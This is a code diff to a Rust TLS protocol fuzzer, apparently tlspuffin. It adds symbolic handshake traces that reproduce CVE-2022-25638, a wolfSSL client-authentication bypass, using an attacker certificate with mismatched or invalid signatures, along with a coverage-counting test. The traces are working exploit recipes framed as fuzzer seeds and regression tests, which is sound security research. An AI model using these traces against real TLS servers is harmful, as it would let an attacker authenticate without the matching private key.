@@ -171,6 +171,449 @@ pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TlsQueryMatcher> {
     trace
 }
 
+pub fn seed_cve_2022_25638_step1(server: AgentName) -> Trace<TlsQueryMatcher> {
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_append_cipher_suite(
+                (fn_new_cipher_suites()),
+                fn_cipher_suite13_aes_128_gcm_sha256
+            )),
+            fn_compressions,
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            fn_client_extensions_new,
+                            (fn_support_group_extension(fn_named_group_secp384r1))
+                        )),
+                        fn_signature_algorithm_extension
+                    )),
+                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                )),
+                fn_supported_versions13_extension
+            ))
+        )
+    };
+
+    // ApplicationData 0 is EncryptedExtensions
+    let certificate_request_message = term! {
+        fn_decrypt_handshake(
+            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
+            (fn_server_hello_transcript(((server, 0)))),
+            (fn_get_server_key_share(((server, 0)))),
+            fn_no_psk,
+            fn_named_group_secp384r1,
+            fn_true,
+            fn_seq_1
+        )
+    };
+
+    let certificate_rsa = term! {
+        fn_certificate13(
+            (fn_get_context((@certificate_request_message))),
+            //fn_empty_certificate_chain
+            // Or append eve cert
+            (fn_append_certificate_entry(
+                (fn_certificate_entry(
+                    fn_eve_cert
+                )),
+              fn_empty_certificate_chain
+            ))
+        )
+    };
+
+    let certificate_verify_rsa = term! {
+        fn_certificate_verify(
+            fn_rsa_pss_signature_algorithm,
+            (fn_rsa_sign_client(
+                (fn_certificate_transcript(((server, 0)))),
+                fn_bob_key,
+                fn_rsa_pss_signature_algorithm
+            ))
+        )
+    };
+
+    let client_finished = term! {
+        fn_finished(
+            (fn_verify_data(
+                (fn_server_finished_transcript(((server, 0)))),
+                (fn_server_hello_transcript(((server, 0)))),
+                (fn_get_server_key_share(((server, 0)))),
+                fn_no_psk,
+                fn_named_group_secp384r1
+            ))
+        )
+    };
+
+    let trace = Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor {
+            name: server,
+            tls_version: TLSVersion::V1_3,
+            typ: AgentType::Server,
+            client_authentication: true,
+            ..AgentDescriptor::default()
+        }],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @client_hello
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_encrypt_handshake(
+                            (@certificate_rsa),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_0  // sequence 0
+                        )
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                         fn_encrypt_handshake(
+                            (@certificate_verify_rsa),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_1  // sequence 1
+                        )
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_encrypt_handshake(
+                            (@client_finished),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_2  // sequence 2
+                        )
+                    },
+                }),
+            },
+        ],
+    };
+
+    trace
+}
+
+pub fn seed_cve_2022_25638_step2(server: AgentName) -> Trace<TlsQueryMatcher> {
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_append_cipher_suite(
+                (fn_new_cipher_suites()),
+                fn_cipher_suite13_aes_128_gcm_sha256
+            )),
+            fn_compressions,
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            fn_client_extensions_new,
+                            (fn_support_group_extension(fn_named_group_secp384r1))
+                        )),
+                        fn_signature_algorithm_extension
+                    )),
+                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                )),
+                fn_supported_versions13_extension
+            ))
+        )
+    };
+
+    // ApplicationData 0 is EncryptedExtensions
+    let certificate_request_message = term! {
+        fn_decrypt_handshake(
+            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
+            (fn_server_hello_transcript(((server, 0)))),
+            (fn_get_server_key_share(((server, 0)))),
+            fn_no_psk,
+            fn_named_group_secp384r1,
+            fn_true,
+            fn_seq_1
+        )
+    };
+
+    let certificate_rsa = term! {
+        fn_certificate13(
+            (fn_get_context((@certificate_request_message))),
+            //fn_empty_certificate_chain
+            // Or append eve cert
+            (fn_append_certificate_entry(
+                (fn_certificate_entry(
+                    fn_eve_cert
+                )),
+              fn_empty_certificate_chain
+            ))
+        )
+    };
+
+    let certificate_verify_rsa = term! {
+        fn_certificate_verify(
+            fn_invalid_signature_algorithm,
+            (fn_rsa_sign_client(
+                (fn_certificate_transcript(((server, 0)))),
+                fn_bob_key,
+                fn_rsa_pss_signature_algorithm
+            ))
+        )
+    };
+
+    let client_finished = term! {
+        fn_finished(
+            (fn_verify_data(
+                (fn_server_finished_transcript(((server, 0)))),
+                (fn_server_hello_transcript(((server, 0)))),
+                (fn_get_server_key_share(((server, 0)))),
+                fn_no_psk,
+                fn_named_group_secp384r1
+            ))
+        )
+    };
+
+    let trace = Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor {
+            name: server,
+            tls_version: TLSVersion::V1_3,
+            typ: AgentType::Server,
+            client_authentication: true,
+            ..AgentDescriptor::default()
+        }],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @client_hello
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_encrypt_handshake(
+                            (@certificate_rsa),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_0  // sequence 0
+                        )
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                         fn_encrypt_handshake(
+                            (@certificate_verify_rsa),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_1  // sequence 1
+                        )
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_encrypt_handshake(
+                            (@client_finished),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_2  // sequence 2
+                        )
+                    },
+                }),
+            },
+        ],
+    };
+
+    trace
+}
+
+pub fn seed_cve_2022_25638_step3(server: AgentName) -> Trace<TlsQueryMatcher> {
+    let client_hello = term! {
+          fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_new_session_id,
+            (fn_append_cipher_suite(
+                (fn_new_cipher_suites()),
+                fn_cipher_suite13_aes_128_gcm_sha256
+            )),
+            fn_compressions,
+            (fn_client_extensions_append(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            fn_client_extensions_new,
+                            (fn_support_group_extension(fn_named_group_secp384r1))
+                        )),
+                        fn_signature_algorithm_extension
+                    )),
+                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
+                )),
+                fn_supported_versions13_extension
+            ))
+        )
+    };
+
+    // ApplicationData 0 is EncryptedExtensions
+    let certificate_request_message = term! {
+        fn_decrypt_handshake(
+            ((server, 1)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
+            (fn_server_hello_transcript(((server, 0)))),
+            (fn_get_server_key_share(((server, 0)))),
+            fn_no_psk,
+            fn_named_group_secp384r1,
+            fn_true,
+            fn_seq_1
+        )
+    };
+
+    let certificate_rsa = term! {
+        fn_certificate13(
+            (fn_get_context((@certificate_request_message))),
+            //fn_empty_certificate_chain
+            // Or append eve cert
+            (fn_append_certificate_entry(
+                (fn_certificate_entry(
+                    fn_eve_cert
+                )),
+              fn_empty_certificate_chain
+            ))
+        )
+    };
+
+    let certificate_verify_rsa = term! {
+        fn_certificate_verify(
+            fn_invalid_signature_algorithm,
+            fn_eve_pkcs1_signature
+        )
+    };
+
+    let client_finished = term! {
+        fn_finished(
+            (fn_verify_data(
+                (fn_server_finished_transcript(((server, 0)))),
+                (fn_server_hello_transcript(((server, 0)))),
+                (fn_get_server_key_share(((server, 0)))),
+                fn_no_psk,
+                fn_named_group_secp384r1
+            ))
+        )
+    };
+
+    let trace = Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor {
+            name: server,
+            tls_version: TLSVersion::V1_3,
+            typ: AgentType::Server,
+            client_authentication: true,
+            ..AgentDescriptor::default()
+        }],
+        steps: vec![
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        @client_hello
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_encrypt_handshake(
+                            (@certificate_rsa),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_0  // sequence 0
+                        )
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                         fn_encrypt_handshake(
+                            (@certificate_verify_rsa),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_1  // sequence 1
+                        )
+                    },
+                }),
+            },
+            Step {
+                agent: server,
+                action: Action::Input(InputAction {
+                    recipe: term! {
+                        fn_encrypt_handshake(
+                            (@client_finished),
+                            (fn_server_hello_transcript(((server, 0)))),
+                            (fn_get_server_key_share(((server, 0)))),
+                            fn_no_psk,
+                            fn_named_group_secp384r1,
+                            fn_true,
+                            fn_seq_2  // sequence 2
+                        )
+                    },
+                }),
+            },
+        ],
+    };
+
+    trace
+}
+
 pub fn seed_almost_cve_2022_25638(server: AgentName) -> Trace<TlsQueryMatcher> {
     let client_hello = term! {
           fn_client_hello(
@@ -1229,10 +1672,14 @@ pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TlsQueryMatcher
 
 #[cfg(test)]
 pub mod tests {
-    use puffin::put::PutOptions;
+    use libafl_targets::{EDGES_MAP, MAX_EDGES_NUM};
+    use puffin::{
+        fuzzer::sanitizer::libafl_targets::__libafl_targets_cmplog_instructions, put::PutOptions,
+    };
     use test_log::test;
 
     use crate::{
+        put_registry::TLS_PUT_REGISTRY,
         test_utils::expect_trace_crash,
         tls::{
             seeds::{seed_session_resumption_dhe_full, seed_successful12_with_tickets},
@@ -1317,8 +1764,7 @@ pub mod tests {
     #[cfg(not(feature = "fix-CVE-2022-25640"))]
     #[should_panic(expected = "Authentication bypass")]
     fn test_seed_cve_2022_25640_simple() {
-        let ctx = seed_cve_2022_25640_simple.execute_trace();
-        assert!(ctx.agents_successful());
+        seed_cve_2022_25640_simple.execute_trace();
     }
 
     #[test]
@@ -1327,9 +1773,55 @@ pub mod tests {
     #[cfg(feature = "client-authentication-transcript-extraction")]
     #[cfg(not(feature = "fix-CVE-2022-25638"))]
     #[should_panic(expected = "Authentication bypass")]
+
     fn test_seed_cve_2022_25638() {
         let ctx = seed_cve_2022_25638.execute_trace();
         assert!(ctx.agents_successful());
+    }
+
+    #[test]
+    #[cfg(feature = "wolfssl510")]
+    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
+    #[cfg(feature = "client-authentication-transcript-extraction")]
+    #[cfg(not(feature = "fix-CVE-2022-25638"))]
+    #[ignore]
+    fn test_seed_cve_2022_25638_coveragetest() {
+        fn hitcount() {
+            unsafe {
+                println!(
+                    "hitcount {}",
+                    EDGES_MAP[0..MAX_EDGES_NUM]
+                        .iter()
+                        .map(|n| *n as u64)
+                        .filter(|n| *n != 0)
+                        .count()
+                );
+
+                /*for i in 0..MAX_EDGES_NUM {
+                    EDGES_MAP[i] = 0;
+                }*/
+            }
+        }
+
+        hitcount();
+
+        seed_cve_2022_25638_step3
+            .build_trace()
+            .execute_deterministic(&TLS_PUT_REGISTRY, PutOptions::default());
+
+        hitcount();
+
+        seed_cve_2022_25638_step1
+            .build_trace()
+            .execute_deterministic(&TLS_PUT_REGISTRY, PutOptions::default());
+
+        hitcount();
+
+        seed_cve_2022_25638_step2
+            .build_trace()
+            .execute_deterministic(&TLS_PUT_REGISTRY, PutOptions::default());
+
+        hitcount();
     }
 
     #[test]
